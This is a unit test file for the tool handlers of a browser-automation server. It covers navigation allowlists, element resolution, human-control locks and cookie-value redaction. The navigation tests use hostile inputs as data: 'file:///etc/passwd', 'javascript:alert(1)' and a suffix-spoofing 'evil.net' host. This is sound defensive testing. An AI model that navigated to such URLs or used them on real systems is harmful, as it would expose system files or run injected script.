/**
 * Tool-handler tests against a fake browser session.
 *
 * These cover the parts that decide *policy* — the navigation allowlist, index
 * and tab resolution, lock enforcement, error mapping — which the browser-tier
 * e2e run exercises only incidentally.
 */
import { assert, assertEquals, assertRejects, assertStringIncludes } from '@std/assert';
import type { BrowserSession } from '@tykotech/browser';
import { EventBus } from '@tykotech/bus';
import { ToolError } from './errors.ts';
import { SessionRegistry } from './registry.ts';
import { OUTPUT } from './schemas.ts';
import { SecretStore } from './secrets.ts';
import { HTML_LIMIT } from './tools/perception.ts';
import type { ToolContext, ToolResult } from './types.ts';
import * as tools from './tools.ts';
import { fromFileUrl } from '@std/path';
import {
	captureHarness,
	CHILD_DOCUMENT,
	type FrameCdpHarness,
	frameCdpHarness,
	PAGE_SESSION,
	type PageOuterHtml,
	TOP_DOC_SENTINEL,
	TOP_DOCUMENT,
} from '../fixtures/capture_session.ts';

interface FakeOptions {
	/**
	 * Tabs as `TabInfo` really shapes them: a full `targetId` plus the
	 * four-character `tabId` a model is shown. Modelling focus on the short id —
	 * as this fake once did — made the unit tier agree with the E-14 defect
	 * instead of catching it.
	 */
	tabs?: Array<{ targetId: string; tabId: string; url: string; title: string }>;
	selectorMap?: Map<number, unknown>;
	dispatchError?: Error;
	/** B1.4: the identity of the table in `selectorMap`. `null` models a build that minted none. */
	stateToken?: string | null;
	/** B1.4: models a session that holds no state at all, which is not the same as an empty table. */
	noCachedState?: boolean;
}

/**
 * A DOM node with the fields the element-event sanitizer walks.
 *
 * The events deep-copy their node, so a thin stub throws inside the vendored
 * constructor rather than in the code under test.
 */
function fakeNode(nodeName = 'BUTTON'): Record<string, unknown> {
	return {
		nodeName,
		nodeId: 1,
		backendNodeId: 1,
		nodeType: 1,
		nodeValue: '',
		attributes: {},
		isScrollable: false,
		isVisible: true,
		absolutePosition: null,
		targetId: 'T1',
		frameId: null,
		sessionId: null,
		parentNode: null,
		childrenNodes: [],
		contentDocument: null,
		axNode: null,
		snapshotNode: null,
		shadowRootType: null,
		shadowRoots: null,
		compoundChildren: [],
		hasJsClickListener: false,
		hiddenElementsInfo: [],
		hasHiddenContent: false,
		uuid: 'node-uuid',
	};
}

/** Records what the handlers dispatch, so assertions can inspect intent. */
interface Fake {
	session: BrowserSession;
	dispatched: Array<{ name: string; event: Record<string, unknown> }>;
}

function fakeSession(options: FakeOptions = {}): Fake {
	const dispatched: Array<{ name: string; event: Record<string, unknown> }> = [];
	const session = {
		tabs: options.tabs ?? [],
		agentFocusTargetId: options.tabs?.[0]?.targetId ?? null,
		cdpClient: null,
		sessionManager: null,
		cachedBrowserState: options.noCachedState === true ? null : {
			url: 'https://example.com/',
			stateToken: options.stateToken === undefined ? 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' : options.stateToken,
			title: 'Example',
			domState: { selectorMap: options.selectorMap ?? new Map(), root: null },
			pageInfo: { viewportWidth: 1280, viewportHeight: 720, pixelsAbove: 0, pixelsBelow: 0, scrollX: 0, scrollY: 0 },
		},
		// A real bus underneath the recording facade: the registry subscribes to
		// it for page-change announcements (R4), and a facade with no `on` would
		// only fail once a browser was involved.
		eventBus: Object.assign(new EventBus({ name: 'fake-tools-session' }), {
			dispatch(event: Record<string, unknown>) {
				dispatched.push({ name: event.constructor.name, event });
				return {
					eventResult: () => {
						if (options.dispatchError !== undefined) return Promise.reject(options.dispatchError);
						return Promise.resolve('ok');
					},
				};
			},
		}),
		stop: () => Promise.resolve(),
		kill: () => Promise.resolve(),
	};
	return { session: session as unknown as BrowserSession, dispatched };
}

async function harness(options: FakeOptions & { allowedDomains?: string[] } = {}) {
	const fake = fakeSession(options);
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		launch: () => Promise.resolve(fake.session),
	});
	const record = await registry.resolve(undefined);
	const ctx: ToolContext = {
		registry,
		allowedDomains: options.allowedDomains ?? [],
		principal: 'test',
	};
	return { registry, ctx, record, fake };
}

function textOf(result: ToolResult): string {
	return (result.content as Array<{ type: string; text?: string }>)
		.filter((block) => block.type === 'text')
		.map((block) => block.text ?? '')
		.join('\n');
}

// --- navigation policy --------------------------------------------------------

Deno.test('tools: navigate refuses a non-http scheme', async () => {
	const { ctx, registry } = await harness();
	for (const url of ['data:text/html,<h1>x', 'file:///etc/passwd', 'javascript:alert(1)']) {
		const error = await assertRejects(() => tools.browserNavigate({ url }, ctx), ToolError);
		assert(
			error.code === 'navigation-blocked' || error.code === 'invalid-arguments',
			`${url} produced ${error.code}`,
		);
	}
	await registry.shutdown();
});

Deno.test('tools: navigate enforces the domain allowlist by suffix', async () => {
	const { ctx, registry } = await harness({ allowedDomains: ['example.com'] });

	// Exact host and subdomains are permitted.
	for (const url of ['https://example.com/a', 'https://docs.example.com/b']) {
		const result = await tools.browserNavigate({ url }, ctx);
		assertStringIncludes(textOf(result), 'session_id');
	}

	// A host that merely ends with the same letters is not a subdomain.
	for (const url of ['https://notexample.com/', 'https://example.com.evil.net/']) {
		const error = await assertRejects(() => tools.browserNavigate({ url }, ctx), ToolError);
		assertEquals(error.code, 'navigation-blocked', url);
	}
	await registry.shutdown();
});

Deno.test('tools: an empty allowlist permits any http(s) host', async () => {
	const { ctx, registry } = await harness({ allowedDomains: [] });
	const result = await tools.browserNavigate({ url: 'https://anywhere.example.org/' }, ctx);
	assertStringIncludes(textOf(result), 'session_id');
	await registry.shutdown();
});

Deno.test('tools: a malformed URL is an argument error, not a policy refusal', async () => {
	const { ctx, registry } = await harness();
	const error = await assertRejects(() => tools.browserNavigate({ url: 'not a url' }, ctx), ToolError);
	assertEquals(error.code, 'invalid-arguments');
	await registry.shutdown();
});

// --- element and tab resolution ------------------------------------------------

Deno.test('tools: clicking an unknown index names the recovery', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[1, fakeNode()]]) });
	const error = await assertRejects(() => tools.browserClick({ index: 99 }, ctx), ToolError);
	assertEquals(error.code, 'unknown-index');
	assertStringIncludes(error.message, 'browser_get_state');
	await registry.shutdown();
});

Deno.test('tools: an index sent with a stale state_token is refused, not resolved (G-1)', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[1, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	// The index exists in the table the server holds. It was read from a different one, and resolving
	// it would click whatever now happens to occupy index 1 on a page the caller has never seen.
	const error = await assertRejects(
		() => tools.browserClick({ index: 1, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
		ToolError,
	);
	assertEquals(error.code, 'element-not-found');
	assertEquals(error.extras.reason, 'stale-token');
	// The current token comes back, so the client can re-read once rather than poll.
	assertEquals(error.extras.state_token, 'cccccccccccccccc.dddddddddddddddd');
	assertEquals(error.extras.index, 1);
	await registry.shutdown();
});

Deno.test('tools: an index sent with no table held reports no-state, not unknown-index (G-1)', async () => {
	const { ctx, registry } = await harness({ noCachedState: true });
	const error = await assertRejects(() => tools.browserClick({ index: 1 }, ctx), ToolError);
	assertEquals(error.code, 'element-not-found');
	assertEquals(error.extras.reason, 'no-state');
	assertEquals(error.extras.state_token, null);
	// The distinction is the whole point of the new code: "re-read the page" and "this index is not
	// in the page you already read" are different instructions to the model.
	assertStringIncludes(error.message, 'browser_get_state');
	await registry.shutdown();
});

Deno.test('tools: omitting state_token keeps 0.1.0 behaviour exactly (additivity)', async () => {
	const { ctx, registry, fake } = await harness({
		selectorMap: new Map([[3, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	// No token sent, a token held that the caller could not possibly match: the call still succeeds.
	await tools.browserClick({ index: 3 }, ctx);
	assertEquals(fake.dispatched.at(-1)?.name, 'ClickElementEvent');
	await registry.shutdown();
});

Deno.test('tools: a click result carries the token of the table it acted on', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[3, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	const result = await tools.browserClick({ index: 3 }, ctx);
	assertEquals(
		(result.structuredContent as { state_token?: unknown }).state_token,
		'cccccccccccccccc.dddddddddddddddd',
	);
	await registry.shutdown();
});

Deno.test('tools: clicking a known index dispatches an element click', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });
	await tools.browserClick({ index: 3 }, ctx);
	assertEquals(fake.dispatched.at(-1)?.name, 'ClickElementEvent');
	await registry.shutdown();
});

Deno.test('tools: clicking coordinates dispatches a coordinate click', async () => {
	const { ctx, registry, fake } = await harness();
	await tools.browserClick({ coordinate_x: 12, coordinate_y: 34 }, ctx);
	const last = fake.dispatched.at(-1);
	assertEquals(last?.name, 'ClickCoordinateEvent');
	assertEquals((last?.event as { coordinateX: number }).coordinateX, 12);
	await registry.shutdown();
});

// --- B2.4: the pointer and keyboard tools ---------------------------------------------

Deno.test('B2.4: double click and right click reach the SAME event with one field changed', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });

	await tools.browserDoubleClick({ index: 3 }, ctx);
	const dbl = fake.dispatched.at(-1);
	assertEquals(dbl?.name, 'ClickElementEvent');
	assertEquals((dbl?.event as { clickCount: number }).clickCount, 2);
	assertEquals((dbl?.event as { button: string }).button, 'left');

	await tools.browserRightClick({ index: 3 }, ctx);
	const right = fake.dispatched.at(-1);
	assertEquals(right?.name, 'ClickElementEvent');
	assertEquals((right?.event as { button: string }).button, 'right');
	assertEquals((right?.event as { clickCount: number }).clickCount, 1);

	// The single click is unchanged by both, which is the additivity claim.
	await tools.browserClick({ index: 3 }, ctx);
	const single = fake.dispatched.at(-1);
	assertEquals((single?.event as { clickCount: number }).clickCount, 1);
	assertEquals((single?.event as { button: string }).button, 'left');
	await registry.shutdown();
});

Deno.test('B2.4: the coordinate arm of each pointer tool carries the same two fields', async () => {
	const { ctx, registry, fake } = await harness();
	await tools.browserDoubleClick({ coordinate_x: 12, coordinate_y: 34 }, ctx);
	const dbl = fake.dispatched.at(-1);
	assertEquals(dbl?.name, 'ClickCoordinateEvent');
	assertEquals((dbl?.event as { clickCount: number }).clickCount, 2);
	await tools.browserRightClick({ coordinate_x: 12, coordinate_y: 34 }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { button: string }).button, 'right');
	await registry.shutdown();
});

Deno.test('B2.4: hover dispatches a HoverEvent and never a click', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });
	await tools.browserHover({ index: 3 }, ctx);
	assertEquals(fake.dispatched.at(-1)?.name, 'HoverEvent');
	await tools.browserHover({ coordinate_x: 7, coordinate_y: 8 }, ctx);
	const point = fake.dispatched.at(-1);
	assertEquals(point?.name, 'HoverEvent');
	assertEquals((point?.event as { node: unknown }).node, null, 'a point hover targets no node');
	assertEquals((point?.event as { coordinateX: number }).coordinateX, 7);
	assert(
		fake.dispatched.every((entry) => !entry.name.startsWith('Click')),
		'no hover may dispatch a click',
	);
	await registry.shutdown();
});

Deno.test('B2.4: a pointer tool resolves its index through the ONE resolver (state_token honoured)', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[3, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	for (
		const call of [
			() => tools.browserDoubleClick({ index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
			() => tools.browserRightClick({ index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
			() => tools.browserHover({ index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
			() => tools.browserPressKey({ key: 'a', index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'element-not-found');
		assertEquals(error.extras.reason, 'stale-token');
	}
	await registry.shutdown();
});

Deno.test('B2.4: press_key folds a modifiers array into the chord and reports the bitfield', async () => {
	const { ctx, registry, fake } = await harness();
	const result = await tools.browserPressKey({ key: 'a', modifiers: ['Control', 'SHIFT'] }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { keys: string }).keys, 'ctrl+shift+a');
	const payload = result.structuredContent as { key: string; modifiers: number };
	assertEquals(payload.key, 'ctrl+shift+a');
	// MODIFIER_BITS: ctrl 2 | shift 8. The bitfield is the vendored table's, not a second one.
	assertEquals(payload.modifiers, 10);
	await registry.shutdown();
});

Deno.test('B2.4: press_key aliases and de-duplicates modifier names', async () => {
	const { ctx, registry, fake } = await harness();
	await tools.browserPressKey({ key: 'k', modifiers: ['cmd', 'command', 'meta'] }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { keys: string }).keys, 'meta+k');
	await registry.shutdown();
});

Deno.test('B2.4: an unknown modifier is REFUSED, never silently dropped', async () => {
	const { ctx, registry, fake } = await harness();
	const error = await assertRejects(() => tools.browserPressKey({ key: 'a', modifiers: ['controll'] }, ctx), ToolError);
	assertEquals(error.code, 'invalid-arguments');
	assertStringIncludes(error.message, 'controll');
	assertEquals(fake.dispatched.length, 0, 'nothing may reach the browser after a refusal');
	await registry.shutdown();
});

Deno.test('B2.4: press_key with an index carries the node so the element is focused first', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });
	const result = await tools.browserPressKey({ key: 'Enter', index: 3 }, ctx);
	const event = fake.dispatched.at(-1);
	assertEquals(event?.name, 'SendKeysEvent');
	assert((event?.event as { node: unknown }).node !== null, 'the node travels with the event (E-50)');
	assertEquals((result.structuredContent as { index?: number }).index, 3);
	// And without an index the event is byte-for-byte the 0.1.0 one.
	await tools.browserPressKey({ key: 'Enter' }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { node: unknown }).node, null);
	await registry.shutdown();
});

Deno.test('B2.4: every new pointer and key tool is refused while a human holds the session', async () => {
	const { ctx, registry, record } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });
	const viewer = {
		id: 'v1',
		principal: 'p',
		mode: 'control' as const,
		send: () => {},
		close: () => {},
	};
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);
	for (
		const call of [
			() => tools.browserDoubleClick({ index: 3 }, ctx),
			() => tools.browserRightClick({ index: 3 }, ctx),
			() => tools.browserHover({ index: 3 }, ctx),
			() => tools.browserPressKey({ key: 'a', modifiers: ['ctrl'] }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'human-has-control');
	}
	await registry.shutdown();
});

// --- B2.5: fill, scrolling, selects, upload, drag ------------------------------------

Deno.test('B2.5: browser_fill clears by DEFAULT where browser_type appends by default', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });

	await tools.browserType({ text: 'hello', index: 3 }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { clear: boolean }).clear, false, 'type appends');

	const filled = await tools.browserFill({ index: 3, text: 'hello' }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { clear: boolean }).clear, true, 'fill replaces');
	assertEquals((filled.structuredContent as { cleared: boolean }).cleared, true);

	const appended = await tools.browserFill({ index: 3, text: 'hello', clear: false }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { clear: boolean }).clear, false);
	assertEquals((appended.structuredContent as { cleared: boolean }).cleared, false);
	await registry.shutdown();
});

Deno.test('B2.5: browser_fill inherits browser_type’s disclosure rules rather than restating them', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });
	const result = await tools.browserFill({ index: 3, text: 'plain text' }, ctx);
	const payload = result.structuredContent as { sensitive: boolean; typed_length?: number; index: number };
	assertEquals(payload.sensitive, false);
	assertEquals(payload.typed_length, 'plain text'.length);
	assertEquals(payload.index, 3);
	await registry.shutdown();
});

Deno.test('B2.5: upload refuses a file id this session never tracked', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });
	const error = await assertRejects(
		() => tools.browserUploadFile({ index: 3, file_id: 'not-a-file' }, ctx),
		ToolError,
	);
	assertEquals(error.code, 'unknown-file');
	assertEquals(
		fake.dispatched.filter((entry) => entry.name === 'UploadFileEvent').length,
		0,
		'nothing may reach the browser before the file resolves',
	);
	await registry.shutdown();
});

Deno.test('B2.5: the CDP-backed actions refuse cleanly on a session with no connection', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[3, fakeNode('SELECT')]]) });
	for (
		const call of [
			() => tools.browserScrollTo({ x: 0, y: 400 }, ctx),
			() => tools.browserScrollIntoView({ index: 3 }, ctx),
			() => tools.browserSelectOption({ index: 3, value: 'b' }, ctx),
			() => tools.browserDrag({ from: { x: 1, y: 2 }, to: { x: 3, y: 4 } }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'browser-unavailable');
	}
	await registry.shutdown();
});

Deno.test('B2.5: every new action tool is refused while a human holds the session', async () => {
	const { ctx, registry, record } = await harness({ selectorMap: new Map([[3, fakeNode('SELECT')]]) });
	const viewer = { id: 'v1', principal: 'p', mode: 'control' as const, send: () => {}, close: () => {} };
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);
	for (
		const call of [
			() => tools.browserFill({ index: 3, text: 'x' }, ctx),
			() => tools.browserScrollTo({ x: 0, y: 1 }, ctx),
			() => tools.browserScrollIntoView({ index: 3 }, ctx),
			() => tools.browserSelectOption({ index: 3, value: 'b' }, ctx),
			() => tools.browserUploadFile({ index: 3, file_id: 'f' }, ctx),
			() => tools.browserDrag({ from: { x: 1, y: 2 }, to: { x: 3, y: 4 } }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'human-has-control');
	}
	await registry.shutdown();
});

Deno.test('B2.5: an index-addressed B2.5 tool honours state_token through the ONE resolver', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[3, fakeNode('SELECT')]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	const stale = 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb';
	for (
		const call of [
			() => tools.browserFill({ index: 3, text: 'x', state_token: stale }, ctx),
			() => tools.browserScrollIntoView({ index: 3, state_token: stale }, ctx),
			() => tools.browserSelectOption({ index: 3, value: 'b', state_token: stale }, ctx),
			() => tools.browserUploadFile({ index: 3, file_id: 'f', state_token: stale }, ctx),
			() => tools.browserDrag({ from: { index: 3 }, to: { x: 1, y: 2 }, state_token: stale }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'element-not-found');
		assertEquals(error.extras.reason, 'stale-token');
	}
	await registry.shutdown();
});

Deno.test('B2.5: handle_dialog says WHY nothing was answered, and never echoes prompt_text', async () => {
	const { ctx, registry, record } = await harness();
	// The fake launcher builds no watchdogs, which is the "this deployment cannot" case.
	assertEquals(record.popups, null);
	const missing = await assertRejects(
		() => tools.browserHandleDialog({ dialog_id: 'd1', accept: true, prompt_text: 'Ada' }, ctx),
		ToolError,
	);
	assertEquals(missing.code, 'feature-unavailable');
	// DD-7 in the shape it takes here: the caller's own text must not come back, in the message or
	// anywhere else, because a second copy in a transcript buys no capability at all.
	assert(!JSON.stringify(missing.structuredPayload).includes('Ada'), missing.message);
	await registry.shutdown();
});

// --- B2.6: session introspection and options ------------------------------------------

Deno.test('B2.6/AC-P1-26: get_session and list_sessions carry EXACTLY the same fields', async () => {
	const { ctx, registry } = await harness({
		tabs: [{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' }],
		allowedDomains: ['a.test'],
	});
	const one = (await tools.browserGetSession({}, ctx)).structuredContent as Record<string, unknown>;
	const listed = (await tools.browserListSessions({}, ctx)).structuredContent as {
		details: Array<Record<string, unknown>>;
	};
	assertEquals(listed.details.length, 1);
	// Field-set equality in both directions, so a field added to one builder cannot reach only one
	// tool — which is the whole content of the acceptance row.
	assertEquals(Object.keys(one).sort(), Object.keys(listed.details[0]!).sort());
	assertEquals(one.session_id, 'default');
	assertEquals(one.origin_allowlist, ['a.test'], 'the list effective for THIS principal');
	assertEquals(one.human_has_control, false);
	assertEquals(one.holder, null);
	assertEquals(one.last_input_at, null, 'a session that has been read but never driven');
	await registry.shutdown();
});

Deno.test('B2.6: list_sessions keeps its frozen text payload and grows only the structured half (I-4)', async () => {
	const { ctx, registry } = await harness();
	const result = await tools.browserListSessions({}, ctx);
	const text = JSON.parse(textOf(result)) as Record<string, unknown>;
	// The 0.1.0 client parses this block. It must still see exactly one key.
	assertEquals(Object.keys(text), ['sessions']);
	assert(!('details' in text), 'the fuller records are structured-only');
	assert('details' in (result.structuredContent as Record<string, unknown>));
	await registry.shutdown();
});

Deno.test('B2.6: get_session reports the holder, and stays available while a human holds it', async () => {
	const { ctx, registry, record } = await harness();
	const viewer = {
		id: 'v1',
		principal: 'operator',
		mode: 'control' as const,
		holderName: 'Ada',
		send: () => {},
		close: () => {},
	};
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);
	// Read-only, so it answers under the lock — which is exactly when a caller wants to know who.
	const payload = (await tools.browserGetSession({}, ctx)).structuredContent as {
		human_has_control: boolean;
		holder: { principal: string; holder_name: string | null } | null;
		viewers: number;
	};
	assertEquals(payload.human_has_control, true);
	assertEquals(payload.holder?.principal, 'operator');
	assertEquals(payload.holder?.holder_name, 'Ada');
	assertEquals(payload.viewers, 1);
	await registry.shutdown();
});

Deno.test('B2.6: set_session_options reports what took and NAMES what did not', async () => {
	const { ctx, registry, record } = await harness();
	// No CDP client on the fake, so every emulation override fails — which is the case `unsupported`
	// exists for, and the tool must still succeed rather than failing the whole call for one field.
	const payload = (await tools.browserSetSessionOptions({
		locale: 'fr-FR',
		timezone: 'Europe/Amsterdam',
		accept_downloads: true,
		idle_timeout_s: 600,
	}, ctx)).structuredContent as {
		applied: Record<string, unknown>;
		unsupported: string[];
		state_token: null;
	};

	// `idle_timeout_s` has a per-session concept now, so it applies with no browser at all.
	assertEquals(payload.applied.idle_timeout_s, 600);
	assertEquals(record.idleTimeoutMs, 600_000);
	// `accept_downloads` is applied through the session's downloads watchdog (A3, E-77); this fake has
	// none, so it is honestly unsupported rather than silently ignored.
	assert(payload.unsupported.includes('accept_downloads'));
	assertEquals(payload.state_token, null);
	await registry.shutdown();
});

Deno.test('B2.6: a per-session idle timeout is what the reaper actually uses', async () => {
	let clock = 1_000_000;
	const fake = fakeSession();
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		sessionTtlMs: 1_000,
		now: () => clock,
		launch: () => Promise.resolve(fake.session),
	});
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	const record = await registry.resolve(undefined);
	await tools.browserSetSessionOptions({ idle_timeout_s: 3_600 }, ctx);

	// Well past the registry-wide 1 s timeout, and nowhere near the session's own hour.
	clock += 60_000;
	assertEquals(await registry.reap(), 0, 'the per-session override is what decides');
	// And a session without an override still reaps on the registry's value.
	record.idleTimeoutMs = undefined;
	assertEquals(await registry.reap(), 1);
	await registry.shutdown();
});

Deno.test('B2.6/AC-P1-30: a storage-state load names the origins it restored, and nothing else', async () => {
	// `tests/.scratch` rather than the system temp: the unit tier's write grant is scoped to it, which
	// is the shipped shape and the reason the grant is worth having.
	const scratch = fromFileUrl(new URL('../../../tests/.scratch', import.meta.url));
	await Deno.mkdir(scratch, { recursive: true });
	const dir = await Deno.makeTempDir({ dir: scratch, prefix: 'ttk-storage-b26-' });
	try {
		const seeded = {
			cookies: [{ name: 'session', value: 'SENTINEL-COOKIE-VALUE', domain: 'a.test', path: '/' }],
			origins: [
				{ origin: 'https://a.test', localStorage: [{ name: 'token', value: 'SENTINEL-STORAGE-VALUE' }] },
				{ origin: 'https://b.test', localStorage: [] },
			],
		};
		await Deno.mkdir(`${dir}/storage`, { recursive: true });
		await Deno.writeTextFile(`${dir}/storage/login.json`, JSON.stringify(seeded));

		const fake = fakeSession();
		const registry = new SessionRegistry({
			reapIntervalMs: 0,
			dataDir: dir,
			launch: () => Promise.resolve(fake.session),
		});
		const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
		const result = await tools.browserStorageState({ action: 'load', name: 'login' }, ctx);
		const payload = result.structuredContent as { restored_origins: string[]; origins: number; cookies: number };

		assertEquals(payload.restored_origins, ['https://a.test', 'https://b.test']);
		assertEquals(payload.origins, 2);
		assertEquals(payload.cookies, 1);
		// SEC-19 / AC-SEC-17: presence without content. Neither the seeded cookie value nor the seeded
		// storage value may appear anywhere in the result — text block included.
		const whole = JSON.stringify(result);
		assert(!whole.includes('SENTINEL-COOKIE-VALUE'), whole);
		assert(!whole.includes('SENTINEL-STORAGE-VALUE'), whole);
		// Nor a cookie name or a storage key: the array is origins, and only origins.
		assert(!whole.includes('"token"'), whole);

		// A save restored nothing, so the key is absent rather than an empty array a caller could read
		// as "restored no origins".
		const saved = await tools.browserStorageState({ action: 'save', name: 'login' }, ctx);
		assert(!('restored_origins' in (saved.structuredContent as Record<string, unknown>)));
		await registry.shutdown();
	} finally {
		await Deno.remove(dir, { recursive: true }).catch(() => {});
	}
});

Deno.test('tools: switching to an unknown tab is refused', async () => {
	const { ctx, registry } = await harness({
		tabs: [{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' }],
	});
	const error = await assertRejects(() => tools.browserSwitchTab({ tab_id: 'T9' }, ctx), ToolError);
	assertEquals(error.code, 'unknown-tab');
	await registry.shutdown();
});

Deno.test('tools: list_tabs reports focus', async () => {
	const { ctx, registry } = await harness({
		tabs: [
			{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' },
			{ targetId: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBT2', tabId: 'T2', url: 'https://b.test/', title: 'B' },
		],
	});
	const parsed = JSON.parse(textOf(await tools.browserListTabs({}, ctx))) as {
		tabs: Array<{ tab_id: string; focused: boolean }>;
	};
	assertEquals(parsed.tabs.length, 2);
	assertEquals(parsed.tabs[0]?.focused, true);
	assertEquals(parsed.tabs[1]?.focused, false);
	await registry.shutdown();
});

// --- scrolling -------------------------------------------------------------------

Deno.test('tools: scroll converts pages into viewport-relative pixels', async () => {
	const { ctx, registry, fake } = await harness();
	await tools.browserScroll({ direction: 'down' }, ctx);
	// The default is 0.75 of a 720px viewport.
	assertEquals((fake.dispatched.at(-1)?.event as { amount: number }).amount, 540);

	await tools.browserScroll({ direction: 'up', pages: 2 }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { amount: number }).amount, 1440);
	await registry.shutdown();
});

// --- lock enforcement --------------------------------------------------------------

Deno.test('tools: a held lock refuses mutation but permits observation', async () => {
	const { ctx, registry, record } = await harness({
		tabs: [{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' }],
	});
	const viewer = {
		id: 'v1',
		mode: 'control' as const,
		principal: 'human',
		send: () => {},
		close: () => {},
	};
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);

	for (
		const call of [
			() => tools.browserNavigate({ url: 'https://a.test/' }, ctx),
			() => tools.browserClick({ coordinate_x: 1, coordinate_y: 1 }, ctx),
			() => tools.browserType({ text: 'hi' }, ctx),
			() => tools.browserPressKey({ key: 'Enter' }, ctx),
			() => tools.browserScroll({ direction: 'down' }, ctx),
			() => tools.browserSwitchTab({ tab_id: 'T1' }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'human-has-control');
	}

	// Observation is deliberately still available: a model that cannot see is
	// worse than one that merely cannot act.
	const tabs = await tools.browserListTabs({}, ctx);
	assertStringIncludes(textOf(tabs), 'T1');
	assertStringIncludes(textOf(await tools.browserListSessions({}, ctx)), 'human_has_control');

	registry.releaseControl(record, 'v1');
	await tools.browserPressKey({ key: 'Enter' }, ctx);
	await registry.shutdown();
});

// --- error mapping -------------------------------------------------------------------

Deno.test('tools: a dispatch timeout maps to the timeout code', async () => {
	const { ctx, registry } = await harness({ dispatchError: new Error('operation timed out after 20s') });
	const error = await assertRejects(() => tools.browserPressKey({ key: 'a' }, ctx), ToolError);
	assertEquals(error.code, 'timeout');
	await registry.shutdown();
});

Deno.test('tools: a crash maps to the crash code', async () => {
	const { ctx, registry } = await harness({ dispatchError: new Error('target crashed unexpectedly') });
	const error = await assertRejects(() => tools.browserGoBack({}, ctx), ToolError);
	assertEquals(error.code, 'browser-crashed');
	await registry.shutdown();
});

// --- sessions ---------------------------------------------------------------------------

Deno.test('tools: closing an unknown session is an error, closing a known one is not', async () => {
	const { ctx, registry, record } = await harness();
	const error = await assertRejects(
		() => tools.browserCloseSession({ session_id: '01JNOPE' }, ctx),
		ToolError,
	);
	assertEquals(error.code, 'unknown-session');

	const ok = await tools.browserCloseSession({ session_id: record.id }, ctx);
	assertStringIncludes(textOf(ok), record.id);
	await registry.shutdown();
});

Deno.test('tools: close_all reports how many it closed', async () => {
	const { ctx, registry } = await harness();
	await registry.createNew();
	const result = await tools.browserCloseAll({}, ctx);
	assertStringIncludes(textOf(result), 'Closed 2 sessions');
	await registry.shutdown();
});

Deno.test('tools: navigate with new_session returns a distinct session id', async () => {
	const { ctx, registry, record } = await harness();
	const result = await tools.browserNavigate({ url: 'https://a.test/', new_session: true }, ctx);
	const parsed = JSON.parse(textOf(result)) as { session_id: string };
	assert(parsed.session_id !== record.id, 'a new session must not reuse the default id');
	assertEquals(registry.size, 2);
	await registry.shutdown();
});

// ---------------------------------------------------------------------------
// session files (E-33)
// ---------------------------------------------------------------------------

